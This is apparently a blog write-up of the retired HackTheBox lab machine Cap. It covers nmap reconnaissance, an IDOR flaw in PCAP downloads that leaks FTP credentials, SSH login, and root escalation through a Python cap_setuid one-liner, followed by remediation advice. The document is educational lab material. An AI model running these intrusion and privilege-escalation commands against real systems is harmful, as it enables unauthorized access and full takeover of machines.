---
title: "Cap Walk-through: HackTheBox Machine Write-up"
date: 2021-10-19
description: "Cap is a beginner Linux machine on HackTheBox. This walkthrough covers nmap recon, discovering a PCAP download vulnerability exposing FTP credentials, and privilege escalation via Linux capabilities."
tags: ["hackthebox", "ctf", "privilege-escalation"]
cover: "https://miro.medium.com/v2/resize:fit:791/1*8T_XCFg5mvf1pACOllyP2Q.png"
canonicalURL: "https://medium.com/bugbountywriteup/cap-walk-through-hackthebox-machine-write-up-6ccacc208d73"
---

Cap is a beginner-friendly Linux machine on HackTheBox. It teaches a common pattern: a web application that exposes network captures, combined with Linux capability abuse for privilege escalation.

> Note: Cap is a retired machine. VIP access is required on HackTheBox to access retired machines.

## Step 1: Reconnaissance

```bash
nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -oN cap.txt 10.10.10.245
```

### Open Ports

| Port | Service | Version |
|------|---------|---------|
| 21/tcp | FTP | vsftpd 3.0.3 |
| 22/tcp | SSH | OpenSSH 8.2p1 Ubuntu |
| 80/tcp | HTTP | gunicorn (Python web server) |

## Step 2: Web Application Enumeration

Visiting port 80 reveals a network monitoring dashboard. The user **Nathan** is already logged in. The app displays network statistics and lets you download PCAP (packet capture) files.

### IDOR — Accessing Other Users' PCAPs

The default URL loads your capture at `/data/5` (or similar). Change the ID to `/data/0`:

```
http://10.10.10.245/data/0
```

This returns a PCAP with **actual FTP session traffic** — including credentials in cleartext.

## Step 3: Extract Credentials from PCAP

Open the PCAP in Wireshark and filter for FTP:

```
ftp
```

The FTP session shows:
```
USER nathan
PASS <password>
```

## Step 4: Initial Access

Use the extracted credentials to SSH in:

```bash
ssh nathan@10.10.10.245
```

Grab the user flag from `/home/nathan/user.txt`.

## Step 5: Privilege Escalation via Linux Capabilities

Check for binaries with special capabilities:

```bash
getcap -r / 2>/dev/null
```

Output includes:
```
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
```

`cap_setuid` on Python means Python can call `setuid(0)` to become root without needing the SUID bit:

```bash
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

You now have a root shell. Grab `/root/root.txt`.

## Why This Works

Linux capabilities are a fine-grained privilege system. `cap_setuid` lets a process change its UID — when granted to an interpreter like Python, it's equivalent to giving root to anyone who can run Python scripts.

### Remediation

```bash
# Remove the capability
setcap -r /usr/bin/python3.8

# Or restrict who can execute Python
chmod 750 /usr/bin/python3.8
chown root:dev /usr/bin/python3.8
```

## Key Takeaways

1. **IDOR in file downloads is critical** — sequential IDs on sensitive files (PCAPs, logs, exports) should never be accessible without authorisation checks
2. **FTP is plaintext** — credentials sent over FTP are visible to anyone capturing traffic on the network
3. **Linux capabilities are overlooked** — `getcap` should be in every privilege escalation checklist alongside SUID, sudo, and cron

---

*HackTheBox machine: Cap (retired). Rated Easy.*
